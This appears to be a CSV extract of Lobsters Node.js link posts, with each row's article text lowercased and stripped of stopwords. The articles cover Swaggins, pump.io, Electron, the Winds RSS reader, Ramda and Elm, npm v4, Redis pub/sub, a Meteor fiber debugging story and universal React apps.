319,Lobsters,nodejs,Node.js programming,Create Swagger documentation after running integration tests,https://github.com/lazywithclass/swaggins,create swagger documentation running integration test,auto generated example swagger doc swagger install usage express example configure test example example run test basic example prepare doc folder serve,look auto generated example swagger doc manual change required swaggins extract useful information swagger doc nodejs http re object information extracted includes path endpoint method endpoint support statuscode returned call endpoint body either passed endpoint via post example received endpoint install g optional might want use swaggins cli usage look express example ideally would following step configure test two way probe proxying nodejs httprequest top test extract passing re everytime need need pas extra information want added documentation could use following header xswagginsendpointdescription endpoint description top implementation note xswagginsstatusdescription status description response class xswagginstag dictate group endpoint fall xswagginspath us provide path could url read like apianswers answerid simply apianswers id prefer want ignore call add xswagginsignore header probe include line top test good go require swaggins probe make sense include test proxy httprequest reason twice example extract pas re need var extract require swaggins extract answer answer function done request http function cb err re body extract re use swaggins expect body toequal done example run test example folder provided basic example swaggins expects run integration test real server get re extract information prepare doc folder point assume json definition run get json definition swaggerui doc serve show api doc run server port want change pas port argument
320,Lobsters,nodejs,Node.js programming,Pump.io 2.0.1 is available,https://strugee.net/blog/2016/11/pump.io-2.0.1-is-available,pumpio available,change admins encouraged upgrade asap change log breaking change unless express change log nonbreaking change upgrading getting help community alex strugeenet,greeting beta period week pumpio available npm github whoohoo originally going couple patch release due outdated documentation several critical bug mostly thing change note release includes security improvement namely newer express version better tl configuration therefore admins encouraged upgrade asap full list change see change log breaking change said beta announcement pumpio dropin replacement unless plugins configured modify template plugins likely affected upgrade express easiest way migrate probably run pumpio test relevant part app see plugin crash might also want look express change log modified template affected template rewrite utml jade migration relatively painless done manually best bet save copy diff created undo change upgrade use diff saved reintroduce change run npm run build making change jade file nonbreaking change release actually relatively minor term nonbreaking change however nice new improvement pump manpage included internal web ui link databypass attribute ignored routing logic useful eg custom page added admin youtube link post shown embeds web ui tl connection use mozilla intermediate cipher suite force server cipher suite preference various minor fix improvement upgrading upgrading deadsimple used recommended install method installed npm upgrade sudo npm install g pumpio installed source upgrade git fetch modified template save diff step git checkout git checkout npm install restore template change npm run lint jade optional recommended changed template npm run build method work whether running beta make sure restart pumpio performing upgrade getting help issue upgrade get touch community also email alex strugeenet
321,Lobsters,nodejs,Node.js programming,Electron: Why? Why not?,https://pave.software/electron-not-building-password-manager-part-1/,electron,electron atom question nativity experiment screenshot showcase sandboxing sandboxing additional restriction nodejs good bad extremely ugly interface native code three different version library rm rf node performance efficiency code distribution electronbuilder conclusion,electron framework build desktop application using chrome ium nodejs probably notably used atom editor created however regularly attract criticism social medium figured share experience picked password management client question nativity probably divisive feature electron give native ui toolkit past task bar integration native menu bar everything must done javascript j html great feature biggest drawback allows webcentric company like create nativeish application without learn native toolkits work major desktop os never look native either although theme come close yet allows go beyond restriction native toolkits case developer really experienced native gui application development le said experiment year ago better team decent web developer make sense condition retool everything native toolkits especially since selection nativewidgetusing multiplatform toolkits le ideal wxwidgets look place example screenshot showcase used case study make apps look place everywhere pain even linux somehow cssbased themeing system brittle prone break old clibrariesandconfigfiles system never mind window osx qt offer brand domjs based uis qt quick come closest even struggle usability problem osx qt quick legacy widget want deliver highquality native user experience ux every major operating system native ux window anyway judging preinstalled application window even microsoft know point none crossplatform solution really going cut without substantial tweak optimization going fully native lot effort use html first step slightly painful hopefully see native theme big platform get small detail honing ux workflow htmlcssjs much flexible allow rapid iteration said see electron replacing native toolkits existing program native toolkits still unbeatable term raw performance integration sandboxing apart ui question underlying code ignoring inevitable language debate moment getting even fun exciting platform want support security issue happen least likely favorite language know due based chromium electron rather extensive sandboxing available making harder although impossible attacker compromise user machine somehow succeed exploiting application sandboxing approach exist somehow o vendor want convince u sandboxing possible using app store uwp mac app store etc holding user hostage extort money application vendor opt app store percent app store tax make apps le exploitable rather questionable behavior see reason support addition chrome sandboxing electron support additional restriction lock webviews even although sadly disabled default like see locked approach default far better make developer think enabling exception making lock apps posthoc nodejs good bad extremely ugly back inevitable language debate honest could without nodejs backend would much partial solution python c go anything really given whole webdev angle electron understand choice plus side allows code sharing app render thread sideeffect free code run without modification others massaged use right ipc object line code reducing code duplication time node allows interface native code mean move actually important performance andor safety critical code eg cryptographic library javascript downside deal insanity npm node community libraryitis need le unique library multiple time electron development environment among three different version library rm rf node honestly good answer opinion considered printable big big disadvantage modern web tooling another reason see electron option replace native code established project performance efficiency usual response mentioning electron hacker news et al something along line know bought gb ram doubt inspired chrome ram efficiency rather lack thereof however come due aforementioned sandboxing splitting program multiple independent process share memory page always come penalty memory efficiency much pronounced multitab application like chrome open tab unheard singletab indeed singledocument app electron come overhead manageable blank hello world app come mb ram usage across process compared mb blank hello world classic widget developer discipline keep memory usage manageable actual application performance reasonable ui snappiness vary wildly depending much torture dom web worker ability move performancecritical section native library make general heavy lifting solvable problem shoving thread modern ui framework tend good performance careful code distribution one advantage electron electronbuilder underlying squirrel surprisingly decent framework roll installers update management window osx give linux package usual suspect minimal preparation heavy lifting checking downloading update including signature verification well un installation automatically server side easily handled well linux build somewhat lacking installing opt default big nono bundling dependency one huge blob standard procedure linux distribution said given sur reality npm ecosystem sure would ever work otherwise conclusion leave u electron certainly messiah application framework delivering u dark age incompatible pc platform strength sandboxing robust distribution system ability mix native interpreted code possibly advantageous feature depending situation full javascript stack htmldriven ux look identical platform chose client password manager able create one unified application deployment operating system reasonably good modern ux keeping security critical code native library sandboxing far tempting combination
322,Lobsters,nodejs,Node.js programming,Winds 0.1.0 - Open source RSS reader,https://github.com/getstream/winds,wind open source r reader,wind beautiful open source r podcast app powered getstreamio description stream algolia aws mongodb atlas sendgrid getting started latest release new macos linux window http windsgetstreamio featured r podcasts wind getstreamio feature glance beautiful ui r podcast recommendation integrated search podcast player r reader tocd roadmap roadmap powered express react redux algolia mongodb atlas sendgrid bull mercury stream sentry aws full stack found stackshareio stream stream algolia algolia javascript search client mongodb mongodb atlas tutorial blog post note http getstreamiowinds implementing search algolia stream wind running nodejs production environment creating restful api design expressjs takeaway building react based app electron wind stack building touch bar support macos electron react testing nodejs simple step optimize app performance mongodb redis nodejs getting started wind open source deploying wind app amazon cloudfront deploying wind api aws ec docker compose download http getstreamiowinds contributing wind tl dr clone repo install dependency homebrew start mongodb locally homebrew official mongodb site start redis locally homebrew official redis site loading test data username password username password stream sign create stream app stream add stream app id api key api secret create stream feed group algolia sign algolia create algolia app index algolia sign algolia application page add algolia application id searchonly api key admin api key file start backend service start frontend electron web app server running test folder adding new test mocha documentation folder building production version prepare build docker build docker container api worker debugging r podcast issue podcasts open graph scraping r discovery article parsing w mercury support github issue instruction maintenance contribution special shoutouts primary maintainer contributor revive r wind time revive r,wind beautiful open source r podcast app powered getstreamio description wind beautiful opensource r podcast app created using react redux frontend expressjs backend use free hosted version run server customize see fit contribution form pull request always appreciated activity feed discovery wind powered stream app leverage algolia search aws hosting mongodb atlas hosted database dbaas sendgrid email service free tier getting started get started wind please download latest release new addition desktop apps macos linux window web version wind available http windsgetstreamio featured r podcasts popular r podcast want featured reach wind getstreamio reply every message feature glance wind packed full awesome feature behind beautiful user interface user experience quick look project offer beautiful ui r podcast recommendation integrated search podcast player r reader tocd roadmap help u improve wind andor vote roadmap powered express react redux algolia mongodb atlas sendgrid bull mercury stream sentry aws full stack found stackshareio stream stream api building activity feed wind follow suggestion list article feed follow powered stream stream account free million feed update handle personalization machine learning user algolia algolia used lightning fast relevant search use javascript search client easily setup wind search implementation algolia account free record operation mongodb mongodb atlas provides database service serf backend datastore wind tutorial blog post following tutorial help start contributing wind also provide inspiration next app note actively working portion readme stay date latest information please signup hosted version http getstreamiowinds implementing search algolia stream wind running nodejs production environment creating restful api design expressjs takeaway building react based app electron wind stack building touch bar support macos electron react testing nodejs simple step optimize app performance mongodb redis nodejs getting started wind open source deploying wind app amazon cloudfront deploying wind api aws ec docker compose download download wind visit http getstreamiowinds contributing wind tl dr command brew install redis mongodb brew service start mongodb brew service start redis cd wind cd api yarn cd app yarn sign stream algolia create following env file app directory replacing key indicated databaseurimongodb localhostwindsdev cacheuriredis jwtsecretyourjwtsecret reactappapiendpointhttp streamapibaseurlhttps streamappidyourstreamappid reactappstreamappidyourstreamappid reactappstreamapikeyyourstreamapikey reactappstreamanalyticsyourstreamanalyticstoken streamapikeyyourstreamapikey streamapisecretyourstreamapisecret reactappalgoliaappidyouralgoliaappid reactappalgoliasearchkeyyouralgoliasearchonlyapikey algoliawritekeyyouralgoliaadminapikey note running test suite need test version env file inside apitest directory run start processdevjson cd app yarn start clone repo git clone git githubcom getstreamwindsgit install dependency following instruction geared towards mac user use brew homebrew install dependency ubuntu user use apt window user install directly dependency site nondebianbased linux user probably able figure cd windsapp yarn cd api yarn start mongodb locally wind us mongodb main datastore contains user r feed podcasts episode article share mac install mongodb homebrew running brew install mongodb also install mongodb official mongodb site also run mongodb background running brew service start mongodb start redis locally stream use redis inmemory storage wind podcast processing r processing worker contains list podcasts r feed worker pick process using bull messaging system mac install redis homebrew running brew install redis also install redis official redis site start redis running redisserver creates default dumprdb file current directory store cached version database location also run redis background running brew service start redis loading test data testing purpose want use test data located use mongoimport mongorestore import data two username password combination testing username admin admincom password admin username test testcom password test need run flushall command redis ensure new content picked note override local data may please cautious also create stream follows please follow feed manually generate stream sign create stream app contribute wind sign stream utilize activity timeline feed reminder stream free application le update per month add stream app id api key api secret env append stream app id api key api secret env file streamappidyourstreamappid streamapikeyyourstreamapikey streamapisecretyourstreamapisecret create stream feed group signed create feed group stream app feed group defines certain type feed within application use add feed group button create following feed feed group name feed group type podcast flat r flat user flat timeline flat folder flat userepisode flat userarticle flat fine enable realtime notification feed group though wo nt using yet algolia sign algolia create algolia app index addition stream also need sign algolia contribute wind search functionality algolia free application record sign algolia application page click new application create new algolia application recommend something similar mywindsapp select datacenter closest application page select index click add new index recommend something similar windsmainindex add algolia application id searchonly api key admin api key env file app click api key button left find app id api key append algolia application id searchonly api key admin api key env file look like reactappalgoliaappidyouralgoliaappid reactappalgoliasearchkeyyouralgoliasearchonlyapikey algoliawritekeyyouralgoliaadminapikey start backend service root directory run start processdevjson see logging information process run log start frontend electron web app server cd app yarn start running test wind api server us test located apitest folder file structure intentionally mirroring file apisrc simplify matching test tested code run test cd api yarn run test run test extended stack trace useful debugging async issue cd api yarn run testdeep adding new test add code file apitest folder preferably mirroring existing file apisrc folder refer mocha documentation example using bddlike dsl writing test module mocked apitestentryjs mock installed module loaded fixture loaded via loadfixture function apitestfixtures folder various utility function provided apitestutiljs see test example usage building production version build production version wind running root directory apibuildsh creates productionready j file apidist run production j file start processprodjson prepare build docker cd api cd script makebuildsh build docker container api worker cd dockercompose command prepare start api worker frontend still need started manually debugging r podcast issue unfortunately unified standard r go api directory run yarn link make command available wind r http techcrunchcomfeed podcasts wind podcast http wwwnprorgrsspodcastphp open graph scraping wind og http r discovery wind discover mashablecom article parsing w mercury wind article http pull request improved r compatibility much appreciated parsing codebase located apisrcparsers support support handled via github issue unfamiliar creating issue github please follow instruction maintenance contribution thank maintainer contributor helped wind become today help stay running every day could nt without special shoutouts primary maintainer contributor revive r r amazing open standard probably pleasant way stay date site podcasts care reason contributing wind explained blogpost wind time revive r section list open source commercial project impact reviving r
323,Lobsters,nodejs,Node.js programming,"Published a post about Ramda, Sanctuary, and #elmlang",https://www.romanzolotarev.com/pagination/,published post ramda sanctuary elmlang,compare javascript ramda elm index index vanilla ramda elm previous next previous next function current page previous next function previous next vanilla javascript naïve implementation ecmascript improve previous built ramda ramda sanctuary implementation ramda sanctuary improve built elm writing elm epilogue javascript equality quirk dom bonus track elm repl see also introduction elm evan czaplicki type signature scott sauyet functors applicatives monad picture aditya bhargava thinking ramda randy coulman professor frisby mostly adequate guide fp brian lonsdorf functionallight javascript kyle simpson awesome fp javascript roman zolotarev user agreement privacy policy,compare javascript ramda elm recently worked pagination web app simple problem good case study comparing javascript elm use case current page address example index list page address index vanilla ramda elm two link previous next clicking link go previous next page accordingly first page previous link disabled last page next disabled current page previous index vanilla ramda elm next disabled link let write two prepare data structure another generate html code based paginate function function take current page list page return tuple previous next element tuple empty html function function take result paginate return html string containing link next previous page handle case current page found either previous next link missing list page page index vanilla ramda elm previous page paginate index page undefined vanilla html paginate index page previous href vanilla next link available html paginate vanilla page href index previous href ramda next nonexistent page html paginate pagex page current found start let implement vanilla javascript vanilla javascript start plain javascript implementation specific ecmascript see improve implement paginate javascript first get index current page array page current found get neighbor return array previous next otherwise return nothing implementing html pretty straightforward get array render string naïve implementation ecmascript var page index vanilla ramda elm var current vanilla var paginate function current page get index current page array page var pagesindexof current current page found index return page previous page page next page else return undefined undefined var html function pagination pagination undefined return current found var previous pagination undefined previous href pagination previous var next pagination undefined next href pagination next return previous next test function page index vanilla ramda elm index vanilla ramda elm current vanilla vanilla paginate current page index ramda html paginate current page href index previous href ramda next improve first undefined value look suspicious take look edge case previous undefined paginate index page undefined vanilla need safer data type second else statement problem possible forget something accidentally miss case need better way branch code built ramda dive implementation let get familiar ramda functional library javascript tried functional programming may look unusual totally worth learning consistently simple backed math fun learn ramda ramda help u write code purer functional style small library dependency work browser well node var number var inc function x return x compare native numbersmap inc ramda rmap inc number look different beginning map work take function functor eg array string object applies function functor value return functor shape rmap inc b b rmap inc b b b rmap inc abc happens pas fewer parameter function expects usually javascript function happy numbersmap typeerror arrayprototypemap callback must function look ramda function rmap function n r e switch argumentslength case return n case return b r n l function n return r n default return b r b e n b r l function n return n e b e l function n return r n r e right return function parameter passed return double checking rmap function n r e switch argumentslength case return n case return b r n l function n return r n default return b r b e n b r l function n return n e b e l function n return r n r e pas one parameter instead two incall rmap inc function n r return r n tapply argument return partially applied function ramda function automatically curried work way curried function take subset parameter return new function take remaining parameter call curried function parameter call function return value following expression return result incall number rmap inc number rmap inc number rmap inc number note ramda function data supplied last parameter make convenient currying way ramda rinc rdec already rmap rdec number probably simplest ramda function ridentity nothing return parameter supplied good placeholder function use example rmap ridentity number next two function name speak rhead return first element array rhead number rlast return last element array rlast number last function need learn rconcat rconcat number glad got far finally point get rid undefined library sanctuary sanctuary functional programming library depends work nicely ramda let compare two indexof function return element found array rindexof number okay kind weird familiar look sanctuary version sindexof number nothing return value maybe type maybe useful composing function might return value one example function return maybe sat take index list return element list index index within list sat number return nothing otherwise sat number nothing compare native javascript alternative number undefined okay sound like get rid undefined handle maybe value apply function maybe value use old good map rmap rinc sjust rmap rinc snothing nothing branching code without using conditionals case two branch left right pagination undefined next left href pagination next right handle convert maybe either either either type represents value two possibility left right smaybetoeither next sjust right smaybetoeither next snothing left next apply two different function left right third parameter left ridentity applied next let hardcode third parameter test seither seither ridentity rtostring sleft next next third parameter right rtostring applied third parameter hardcoded seither ridentity rtostring sright congratulation ready read refactored solution implementation ramda sanctuary var r require ramda var require sanctuary var page index vanilla ramda elm var current ramda var paginate function current page return rmap function index return sat rdec index page sat rinc index page get index current page sindexof current page var html function pagination var previous function url return href url previous var next function url return href url next var button function x return rconcat seither ridentity previous smaybetoeither previous rhead x seither ridentity next smaybetoeither next rlast x return seither ridentity button smaybetoeither current found pagination let test page index vanilla ramda elm index vanilla ramda elm current ramda ramda paginate ramda page vanilla elm html paginate ramda page href vanilla previous href elm next improve syntax getting pretty lengthy noisy ecmascript solves partially const paginate current page rmap rmap sat rdec page sat rinc page sindexof current page way vanilla version ecmascript const paginate current page const pagesindexof current return page page undefined another problem solution html return string would good dom element instead manipulate dom use one virtual dom library framework like react angular ember vue looking lighter purely functional solution elm better option built elm playing elm several month find fascinating helpful error message compiles work runtime error good performance clean syntax simple refactoring writing elm create file say paginationelm using module import explicitly implementation elm using list type list page get value index use getat get index value use elemindex function listextra module let import listextra listextragetat page elm use exposing keyword import particular function module call without qualifier import listextra exposing getat elemindex getat page elm elemindex elm page see need bracket function call function name list parameter define function type function name list parameter sign finally definition inc x x inc define local function inside function let keywords current ramda iscurrent page let current elm page current iscurrent elm true handle case use case keywords useful pattern matching important difference elm compiler let forget cover case make sure branch return value shape get index page case index index nothing index probably noticed summing number elm use concatenate string need function paginate return tuple data type elm syntax pagination elm nothing oh maybe type elm core library need import html element function html module create link html element need call function htmla two parameter list attribute list child htmla htmlattributeshref ramda htmltext previous guess href function htmlattributes module text function html module know enough elm read code import html exposing div text import htmlattributes exposing href import listextra exposing getat elemindex page index vanilla ramda elm current elm paginate current page case elemindex current page getat page getat page nothing nothing html pagination let next page case page url href url text next nothing text next previous page case page url href url text previous nothing text previous case pagination nothing nothing text current found p n div previous p next n main html paginate current page epilogue may ask point adding line code introducing new library weird data type even new language complicate everything first type safety help avoid runtime error catch mistake earlier second pure function much simpler understand maintain refactor third case composability pointfree style make code much cleaner building small web app file size critical nothing beat vanilla javascript course however app grows ramda elm save mistake make developer experience much better still better know javascript equality quirk manipulate dom directly manage scope avoid mutable state handle null etc javascript weird learn billion people use web browser javascript scripting language natively supported web browser today javascript getting better changed dramatically anytime soon bonus track thank reading far another implementation elm core library copypaste elm repl play import html import list page index vanilla ramda elm current elm paginate current page let c page listmap n listdrop c nothing p nothing listtake listlength c c iscurrent p c n case c current true p n false nothing p c n p c n p c n listfiltermap iscurrent main paginate current page tostring htmltext ramda elm nothing see also introduction elm evan czaplicki type signature scott sauyet functors applicatives monad picture aditya bhargava thinking ramda randy coulman professor frisby mostly adequate guide fp brian lonsdorf functionallight javascript kyle simpson awesome fp javascript roman zolotarev user agreement privacy policy
324,Lobsters,nodejs,Node.js programming,npm v4,https://github.com/npm/npm/releases/tag/v4.0.0,npm,brief overview breaking change search rewrite breaking npmsio script node path breaking addaleax addaleax addaleax remove breaking new script deprecated breaking run partial shrinkwraps breaking iarna iarna removed breaking iarna nonzero exit code outdated dependency breaking send extra header registry npmnpmregistryclient iarna iarna iarna bugfixes watilde creationix patch zkat iarna doc update dependency,welcome npm friend first semver major release since release npm year ago back turned bit groundshaking release brandnew installer significant structural change npm set tree end era way npm also mark release move npm npm maintenance longer updating release branch anything except critical bugfixes security patch predecessor pretty serious impact npm expected much smaller effect daytoday use npm past year collected handful breaking change wanted get breaking strict semver interpretation follow simple usability improvement others fix crash serious issue required major release include hope release see well look forward accelerated release pace cli team done focusing sustaining work window fixing big bug push start focusing usability feature performance keep eye npm planning major overhaul shrinkwrap well various speed usability fix release gon na fun ride promise brief overview breaking change following breaking change included release npm search rewritten stream result longer support sorting npm script longer prepend path node executable used run npm running script scriptsprependnodepath option added configure behavior npat removed prepublish deprecated replaced prepare prepublishonly script temporarily added run npm publish npm outdated exit exit code find outdated package npm tag removed deprecation cycle use npm disttag partial shrinkwraps longer supported npmshrinkwrapjson considered complete installation manifest except devdependencies npm default git branch longer master using latest search rewrite breaking let face npm search simply nt work anymore apart fact grew slower year reached point longer fit entire registry metadata memory anyone try use command see really awful memory overflow crash node still going time cli registry web team able overhaul npm search altogether rewritten previous npm search implementation stream result fly search endpoint local cache absolute term wo nt see performance increase patch come cost sorting capability start outputting result find make experience much better overall believe acceptable bandaid search endpoint place incidentally want really nice search experience recommend checking npmsio includes handydandy npmscli commandline usage npm search site return highquality result quickly operated member npm community script node path breaking thanks great addaleax addressed fairly tricky issue involving node process used npm script previously npm would prefix path node executable script path benefit making sure node process would npm script unless something like nodebin nodemodules turn lot people relied behavior way turn unintended consequence broke system like nyc also completely brokedefeated thing like rvm virtualenv often causing thing relied fall back global system version ruby python face two perfectly valid used alternative decided second case much surprising user err side user expect anna put hard work managed put together patch change npm behavior longer prepend node executable path default add new option scriptsprependnodepath allow user rely behavior add node path patch also make feature discoverable people might run first case warning node executable either missing shadowed another one path warning also disabled scriptsprependnodepath option needed add scriptsprependnodepath option configure whether npm prepends current node executable path path addaleax change default behaviour npm never prepending current node executable directory path printing warning case previously addaleax remove npat breaking let real almost one know feature ever existed vestigial feature day ideal npm distribute full package could directly developed even registry turn npm community decided go different way primarily publishing package productionready format test build tool etc say goodbye npat new prepare script prepublish deprecated breaking anything really seemed confuse user prepublish script ran invoking npm install without argument turn many many people really expected would run npm publish even actually people expected prepare package publishing registry added prepare command run exact case prepublish ran begun deprecation cycle prepublish run npm install include warning time use way also added prepublishonly script execute npm publish invoked eventually prepublish stop executing npm install prepublishonly removed leaving prepare prepublish two distinct lifecycles partial shrinkwraps breaking right partial shrinkwraps mean npmshrinkwrapjson project npm longer install anything nt explicitly listed unless devdependency open door nice optimization make use npm shrinkwrap generally smoother removing awful corner case also skip devdependency installation packagejson added devdependencies shrinkwrap using npm shrinkwrap dev use readshrinkwrap read top level shrinkwrap reason npm bespoke heirloomgrade artisanal thing iarna treat shrinkwrap canonical nt try fill partial shrinkwraps partial shrinkwraps produce partial installs shrinkwrap contains devdependencies still try install packagejson instead assuming never want devdependencies iarna npm tag removed breaking remove deprecated tag command folk must use disttag command iarna nonzero exit code outdated dependency breaking send extra header registry purpose supporting shiny new registry feature started sending npmscope npminci header outgoing request npmnpmregistryclient npmregistryclient allow npm add header outgoing request add npminci header report whether running ci iarna send npmscope header along request registry npmscope set scope current top level project allow registry implement userscopeaware feature service iarna add test ensure npminci header sent ci set env iarna bugfixes fix bug installing shrinkwrapped package would fail platform failed install optional dependency included shrinkwrap watilde package malformed metadata noderequiredby sometimes missing stop crashing happens creationix patch remove ancient alias rather around zkat detect unsupported nodejs version warn also error really old version know ca nt work iarna doc update dependency
325,Lobsters,nodejs,Node.js programming,Redis Pub/Sub: Node.js Guide,http://www.redisgreen.net/blog/pubsub-howto/,redis pubsub nodejs guide,redis pubsub howto guide overview article redis pubsub noderedis understanding channel channel console console publishing message command syntax nodejs example using redis command fast operation subscribing message command syntax nodejs example using command subscriber pattern matching command syntax nodejs example side note performance characteristic code support redisgreennet back doc,redis pubsub howto guide overview article redis pubsub discus purpose pubsub describes design choice redis pubsub particular turn use redis pubsub stepping main concept redis pubsub channel publishing subscribing patternmatching using noderedis nodejs client understanding channel channel name used categorize message published pubsub system channel systemdependent name like systemhealth tradeprices rax tempreading livingroom something generic like event subscriber interested data appears channel listen new publisher subscriber easily added system grows find channel active redis server use pubsub channel command return nothing system yet used pubsub rediscli pubsub channel empty list set channel exist system subscriber listening message need ever create remove channel exist subscriber listening see use rediscli act subscriber one console window run pubsub channel another window console rediscli subscribe event reading message press ctrlc quit subscribe event integer console rediscli pubsub channel event soon console disconnect system channel publishing message command syntax publish command used publish message subscriber listening channel sent message subscriber around receive message message dropped nodejs example creating regular connection redis publish used like command var client require redis createclient clientpublish tempreading livingroom using redis command publishing data channel fast operation commonly used tandem operation combining operation like unlocks power redis var client require redis createclient clientmulti publish tempreading livingroom lpush recenttemperatures ltrim recenttemperatures exec operation earlier example pubsub system multiexec transaction temperature also pushed onto list keep recent temperature short example show way integrate redis pubsub larger system design includes message history operation like one let client query recent value well subscribe new one subscribing message command syntax subscribe command used subscribe channel command put client special subscribed state longer sends command additional subscribe unsubscribe command subscribe channel channel nodejs example subscriber could used earlier publisher example var subscriber require redis createclient subscriberon message function channel message consolelog temperature message read subscribersubscribe tempreading livingroom us simple event emitter call function every time message arrives handling function log temperature console right could anything using command subscriber mentioned earlier subscribed client special mode used command use command create separate client connection redis var redis require redis subscriber rediscreateclient client rediscreateclient subscriberon message function channel message consolelog temperature message read clientincr tempcount subscribersubscribe tempreading livingroom handler log message console increment redis counter case might calculate result publish result separate channel subscriber read publish back channel listening cause infinite loop pattern matching command syntax psubscribe command used matching channel pattern psubscribe pattern pattern work normal subscribe command allows match channel name match pattern let publisher specific information publishing allows subscriber listen many channel without knowing precise name supported pattern simple match character match single character bracket used match set acceptable character like acd match temperature reading several room psubscribe tempreading match event ab test like sitelink logo clickrate sitelink logo b clickrate psubscribe sitelink logo clickrate match event across series aws instance published event like systemhealth systemhealth psubscribe systemhealth acd nodejs example example could also used earlier publishing example temperature logged along room temperature read var subscriber require redis createclient subscriberon pmessage function pattern channel message var room channelsplit consolelog temperature message read room subscriberpsubscribe tempreading patternbased subscriber get detail callback channel message particular pattern matched since subscriber listen multiple channel pattern side note performance characteristic publish every command redis documented time complexity time complexity intuitive since publish operation feel simple almost like set one might assume complexity fact time complexity publish grows linearly according behavior subscriber publish command run must step pattern subscribed might match channel subscriber receive message resulting time complexity nm deployment never experience performance trouble complexity publish tracking performance command time still wise careful code automatically generates pattern channel listen code love feature walkthrough great example apps built using redis pubsub know good example send u note support redisgreennet best feature code see last updated oct originally written brian p orourke back doc
326,Lobsters,nodejs,Node.js programming,The Mysterious Fiber Bomb Problem: A Debugging Story,https://sandstorm.io/news/2016-09-30-fiber-bomb-debugging-story,mysterious fiber bomb problem debugging story,mysterious fiber bomb problem debugging story kenton varda eating cpu scale nodefibers npm package meteor creating bad monkeypatch proto patched filed issue,mysterious fiber bomb problem debugging story kenton varda sep month two ago started seeing mysterious problem production every one nodejs web server process supporting sandstorm oasis would suddenly jump cpu usage one core stay killed problem infinite loop though process continued respond request slowly since process continued respond request continued pas health check never restarted automatically user assigned shard service essentially unusable every action would take second complete problem left nothing suspicious log gap far fewer request normal handled first problem struck week seemingly random kind bug web worst nightmare debug something reproduce week random real user line could even cause process slow stop way eating cpu obviously needed take cpu profile bug progress course bug reproduced production therefore take profile production ruled profiling technology would harm performance time instrumented binary need sampling profiler could run existing process ondemand would understand c javascript last requirement ruled personal favorite profiler pprof googleperftools luckily turn correct modern answer tool sampling profiler relies linux kernel apis thus requiring loading code target binary least cc javascript turn builtin support generating tell tool map jited code location back javascript source pas perfbasicprofonlyfunctions flag node commandline flag safe production writes data disk time rebuild vms weekly file never get large enough problem armed new knowledge waited finally day pager went shelled broken server recorded tensecond profile restarted node downloaded data analysis upon running perf presented well look promising almost time spent two c function perf viewer make easy jump directly disassembly wow almost cpu time spent handful instruction fact looking two different inlined copy c code looking loop traverse linked list trying find element particular id spending majority cpu time scanning one linked list scale code might surprised see word implement javascript language known almost militantly opposed thread turn though support simulated thread implemented entirely userspace cooperative switching node user take advantage via nodefibers npm package package allows avoid instead instantiating arbitrarily many call stack jumping whenever need wait asynchronous operation code fact using nodefibers mostly built meteor us fiber default linked list question implement map thread id perthread data threadlocal variable among thing every time process switch fiber current thread looked table fresh c grad know linked list ideal data structure lookup table probably want hashtable redblack tree like many experienced engineer know linked list efficient structure case number element stay small developer turn designed around assumption fixed thread pool never containing handful thread nodefibers especially used meteor work way meteor every concurrent operation get fiber fiber completes placed pool reuse many fiber needed simultaneously pool grow size pool get bigger linked list get bigger make fiberswitching slower make whole process permanently slower creating process getting slower time getting suddenly slower one moment process fine next hosed normal load server sitting steady around fiber nowhere near enough problem new mystery causing sudden spike fiber creation around time started referring incident ala profile showed u aftereffect bomb gone told u nothing fiber created first place back square one early morning september problem became suddenly urgent instead week problem started happening approximately hour like good production problem began midnight three iteration paged wake restart process go back grudgingly accepted could wait morning hotpatched server monitor fiber count kill whenever number went process observed typical created anywhere fiber still root cause mystery server managing restarts pager quieting crawled back bed spike continued happen approximately hour actually wonderful meant could iterate problem faster could began manually instrumenting codebase sort sampling profiler specifically sampled fiber creation specifically time fiber count seemed spiking turned easy sound many place would create fiber result task queued previously time fiber creation queue insertion longer stack instrument queue insert bad monkeypatch soon made startling discovery turned meteor monkeypatched global promise implementation specifically apparently decided wanted callback always run fiber convenience since meteor code requires run fiber thus wrote code intercept call wrap callback another callback creates new fiber run original callback inside might sound basically reasonable first standard promise semantics problem code make heavy idiomatic use promise common string together long chain short callback happens sandstorm contains lot promisebased code especially around communicating backend using proto api make heavy use promise expect run fiber thus code seemingly nothing fiber fact main creator fiber system creating massive quantity totally unnecessary fiber wasting memory cpu time even actually explain bomb way fiber work start new fiber immediately completes fiber immediately go back fiber pool promiseheavy code operated asynchronous style therefore callback would always complete immediately promise code needlessly starting lot fiber actually reusing fiber object one wrinkle turn promise implementation sometimes call recursively passing along one callback one promise another fact correctly implement spec since monkeypatched time callback passed another call received another wrapper layer spawning another fiber end one callback finally called would start fiber would start another fiber would start another fiber since fiber chain responsible spawning next fiber would started completed one callback managed wrapped time get fiber patched promise monkeypatch wrapping callback would mark wrapped callback object field like alreadywrapped true callback came back wrapped code would see marking avoid doublewrapping like problem stopped meanwhile also filed issue requesting replace linked list hashtable completely mitigated fiber bomb would least prevented permanently crippling process
327,Lobsters,nodejs,Node.js programming,React on the Server for Beginners: Build a Universal React and Node App,https://scotch.io/tutorials/react-on-the-server-for-beginners-build-a-universal-react-and-node-app,react server beginner build universal react node app,universal javascript react react router express nodejs design pattern second edition packt universal javascript long debate module sharing universal rendering universal routing universal data retrival babel ecmascript webpack judo fan demo app one curl nodejs npm babel ejs express react reactrouter webpack httpserver excellent article react component react related article scotchio download check official repository image file flag component prop validation default medal component athlete preview component layout component index page component jsx spread operator athlete page component found page component app route component hashhistory uglifyjs mile rausch production http configuration object callback function http universal data retrival universal javascript web application nodejs design pattern huge thanks mario casciaro marwen trabelsi criticalmas follow loige twitter,article going learn build simple universal javascript application aka isomorphic using react react router express warm finger get keyboard ready going fun hi luciano coauthor nodejs design pattern second edition packt book take journey across various idea component challenge would commonly encounter designing developing software using nodejs platform book discover nodejs way dealing design coding decision also feature entire chapter dedicated universal javascript first time read term keep reading going love article one advantage nodejs runtime backend web application deal javascript single language across web stack capability totally legit willing share code frontend backend reduce code duplication browser server bare minimun art creating javascript code environment agnostic today recognized universal javascript term long debate seems war original name isomorphic javascript main concern generally face building universal javascript application module sharing use nodejs module also browser universal rendering render view application server initialization app keep rendering view directly browser avoiding full page refresh user keep navigating across different section universal routing recognize view associated current route server browser universal data retrival access data typically apis server browser universal javascript still pretty fresh field framework approach emerged defacto standard readymade solution problem yet although already miriad stable well known library tool combined successfully build universal javascript web application article going use react companion library react router express build simple application focused showcasing universal rendering routing also use babel take advantage lovely ecmascript syntax webpack build code browser judo fan app going build today judo hero web app showcase famous judo athlete collection medal olympic game prestigious international tournament app essentially two view go vanilla javascript react watch free index page select athlete athlete page showcase medal detail understand better work look demo app navigate across view matter anyway probably asking yes look like simple app 